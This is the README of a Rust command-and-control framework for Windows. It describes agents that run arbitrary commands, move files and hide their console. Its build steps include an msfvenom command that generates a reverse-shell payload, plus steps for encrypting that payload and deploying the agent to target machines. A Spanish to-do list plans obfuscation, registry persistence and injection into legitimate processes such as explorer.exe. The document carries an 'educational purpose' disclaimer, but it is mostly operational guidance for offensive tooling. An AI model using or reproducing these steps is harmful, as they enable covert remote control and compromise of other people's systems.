# C2R2 v2.0 - Direct Connection
Command & Control Framework written in Rust

[![Rust](https://img.shields.io/badge/Rust-1.90.0-orange.svg)](https://www.rust-lang.org/)
[![License](https://img.shields.io/badge/License-Educational-red.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/Platform-Windows-blue.svg)](https://www.microsoft.com/windows)

## ⚠️ Educational Purpose Only
**Do not use this tool for illegal activities. This project is for educational and authorized security testing purposes only.**

---

## 🚀 Features

### v2.0 - Direct Connection (Current)
- ✅ **Direct TCP Connection** - No shellcode, no encryption overhead
- ✅ **Multi-Client Support** - Handle multiple agents simultaneously
- ✅ **System Information** - Auto-collect hostname, username, OS, privileges
- ✅ **Remote Command Execution** - Execute arbitrary commands via cmd
- ✅ **File Transfer** - Download/Upload files with Base64 encoding
- ✅ **Keep-Alive** - 30-second ping/pong mechanism
- ✅ **Colored CLI** - Beautiful terminal interface with tables
- ✅ **Cross-Compilation** - Build Windows agents from Linux (Kali)
- ✅ **Lightweight Agent** - ~60KB binary, zero dependencies

### Available Commands
```
📋 /list                      - List all connected clients
🎯 /select <id>               - Select a client by ID
📤 /cmd <command>             - Send command to selected client
📡 /cmd_all <command>         - Send command to ALL clients
📥 /download <remote_path>    - Download file from agent
📤 /upload <local> <remote>   - Upload file to agent
ℹ️  /info <id>                - Show detailed client information
🔄 /deselect                  - Deselect current client
❓ /help                      - Show help menu
👋 /exit, /quit               - Close server
```

---

## 🔧 Installation & Usage

### Prerequisites
- Rust toolchain installed (`curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh`)
- Git installed

### Building the Project
```bash
# Clone the repository
git clone <repository-url>
cd C2R2

# Build in release mode
cargo build -p c2r2-server --release
cargo build --release -p builder
❯ msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.110.129 LPORT=4444 -f raw -o rev.bin
❯ ./builder --encrypt rev.bin
./builder ../../rev.bin --name agent_test --server 192.168.110.129:4444
# The binaries will be located in target/release/
```

### Running the Listener
```bash
# Run the C2 listener
./target/release/listener

# Or with custom port
./target/release/listener --port 4444
```

### Deploying the Agent
```bash
# Transfer the agent binary to target system
scp target/release/agent user@target:/tmp/

# Execute on target (example)
./agent --server <listener-ip>:4444
```

## ToDo

- [x] Que no aparezca la consola del agente
- [x] Crear un listener para tener multiples conexiones simultaneas con diferentes agentes
- [ ] Mejorar la ofuscación del agente

### Crear persistencia
- [ ] Cuando se ejecute el agente, que se copie a %APPDATA% y se añada al registro para que se ejecute al iniciar sesión o al iniciar el sistema.
- [ ] Que se pueda inyectar en un proceso legítimo (explorer.exe, svchost.exe, etc)


### Listener
- [ ] Crear un listener con sockets para tener multiples conexiones simultaneas con diferentes agentes
- [ ] Cuando se manda un comando que se haga de manera asíncrona para no bloquear la comunicación con el agente y además de una manera más sigilosa (threads, async/await, sleep, etc)
- Crear un servidor que se encargue de recibir las conexiones de los agentes y enviarles comandos y que este servidor se comunique con la interfaz C2 (Telegram bot, web, etc)

### Interfaz C2
- [ ] Crear una interfaz mediante Telegram bot que permita enviar comandos y recibir respuestas de los agentes

